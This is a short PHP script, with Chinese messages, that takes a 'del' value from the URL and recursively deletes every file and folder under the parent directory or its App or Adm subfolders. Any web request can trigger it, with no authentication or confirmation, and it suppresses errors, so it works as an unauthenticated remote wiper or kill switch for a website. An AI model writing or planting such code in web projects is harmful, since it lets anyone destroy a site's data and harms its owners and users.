<?php
$del = $_GET['del'];
switch ($del) {
  case 1: $path = "../"; break;
  case 2: $path = "../App/"; break;
  case 3: $path = "../Adm/";  break;
  default: echo "参数无效";die; break;
}
function deldir($path){
 if(is_dir($path)){
 $p = scandir($path);
 foreach($p as $val){
  if($val !="." && $val !=".."){
   if(is_dir($path.$val)){
    deldir($path.$val.'/');
    @rmdir($path.$val.'/');
   }else{unlink($path.$val);}}}}}
//调用函数，传入路径
$arr = deldir($path);
var_dump($arr);
@rmdir($path);